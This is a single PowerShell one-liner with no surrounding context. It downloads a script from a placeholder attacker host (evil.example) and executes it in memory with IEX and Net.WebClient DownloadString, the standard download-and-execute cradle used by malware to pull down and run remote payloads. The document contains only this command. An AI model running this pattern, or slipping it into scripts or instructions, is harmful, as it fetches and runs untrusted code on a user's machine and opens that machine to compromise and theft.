$u='http://evil.example/p.ps1'; IEX (New-Object Net.WebClient).DownloadString($u)
